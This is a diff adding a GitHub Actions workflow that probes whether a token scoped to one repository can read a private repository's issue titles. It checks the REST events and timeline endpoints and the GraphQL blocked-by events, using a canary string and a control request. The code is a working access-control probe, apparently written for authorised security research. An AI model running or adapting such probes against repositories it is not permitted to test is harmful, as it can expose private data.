@@ -1,0 +1,53 @@
+name: apex-timeline-probe
+on:
+  workflow_dispatch:
+permissions:
+  issues: write
+  contents: read
+jobs:
+  tl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dependency timeline serializer leak (repo-A-scoped token, cannot read private repo-B)
+        env:
+          GH_TOKEN: ${{ github.token }}
+          OWNER: MrW0r57
+          A: apex-dep-a
+          B: apex-dep-b
+          CAN: CANARY_PRIV_9f3a1c
+        run: |
+          set +e
+          mkdir -p /tmp/o
+          hdr=(-H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28")
+
+          # CONTROL: this token direct-reads private repo-B issue -> expect 404
+          CTRL=$(curl -s -o /tmp/o/ctrl -w "%{http_code}" "${hdr[@]}" https://api.github.com/repos/$OWNER/$B/issues/1)
+
+          # A) REST events endpoint on the PUBLIC parent
+          EV=$(curl -s -o /tmp/o/ev -w "%{http_code}" "${hdr[@]}" "https://api.github.com/repos/$OWNER/$A/issues/1/events?per_page=100")
+          # B) REST timeline endpoint on the PUBLIC parent
+          TL=$(curl -s -o /tmp/o/tl -w "%{http_code}" "${hdr[@]}" "https://api.github.com/repos/$OWNER/$A/issues/1/timeline?per_page=100")
+          # C) GraphQL timelineItems -> BlockedByAddedEvent.blockedBy (raw; grep canary)
+          jq -n '{query:"{repository(owner:\"MrW0r57\",name:\"apex-dep-a\"){issue(number:1){timelineItems(first:50){nodes{__typename ... on BlockedByAddedEvent{blockedBy{number title repository{nameWithOwner isPrivate}}}}}}}}"}' > /tmp/o/q.json
+          GQ=$(curl -s -o /tmp/o/gq -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" -H "Content-Type: application/json" -X POST --data @/tmp/o/q.json https://api.github.com/graphql)
+
+          leak() { grep -q "$CAN" "$1" && echo true || echo false; }
+          EV_LEAK=$(leak /tmp/o/ev); TL_LEAK=$(leak /tmp/o/tl); GQ_LEAK=$(leak /tmp/o/gq)
+          # extract any blocked_by title the scoped token can see via REST events
+          EV_TITLE=$(jq -r '[.[]?|select(.event|startswith("blocked"))|.blocked_by.title]|map(select(.!=null))|join(" | ")' /tmp/o/ev 2>/dev/null)
+          TL_TITLE=$(jq -r '[.[]?|select(.event|startswith("blocked"))|.blocked_by.title]|map(select(.!=null))|join(" | ")' /tmp/o/tl 2>/dev/null)
+          GQ_TITLE=$(jq -r '[.data.repository.issue.timelineItems.nodes[]?|select(.__typename=="BlockedByAddedEvent")|.blockedBy.title]|map(select(.!=null))|join(" | ")' /tmp/o/gq 2>/dev/null)
+
+          jq -n --arg ctrl "$CTRL" --arg ev "$EV" --arg tl "$TL" --arg gq "$GQ" \
+                --argjson evl $EV_LEAK --argjson tll $TL_LEAK --argjson gql $GQ_LEAK \
+                --arg evt "$EV_TITLE" --arg tlt "$TL_TITLE" --arg gqt "$GQ_TITLE" \
+            '{control_direct_repoB_status_expect404:$ctrl,
+              rest_events_http:$ev, rest_events_canary_leak:$evl, rest_events_blocked_by_title:$evt,
+              rest_timeline_http:$tl, rest_timeline_canary_leak:$tll, rest_timeline_blocked_by_title:$tlt,
+              graphql_http:$gq, graphql_canary_leak:$gql, graphql_blocked_by_title:$gqt,
+              ANY_LEAK:($evl or $tll or $gql)}' > /tmp/o/result.json
+          echo "=== APEX_TL_RESULT ==="; cat /tmp/o/result.json
+
+          jq -n --rawfile r /tmp/o/result.json '{body:("APEX-TL-RESULT\n\n```json\n"+$r+"\n```")}' > /tmp/o/c.json
+          curl -s -X POST "${hdr[@]}" -d @/tmp/o/c.json https://api.github.com/repos/$OWNER/$A/issues/1/comments >/dev/null
+          echo posted
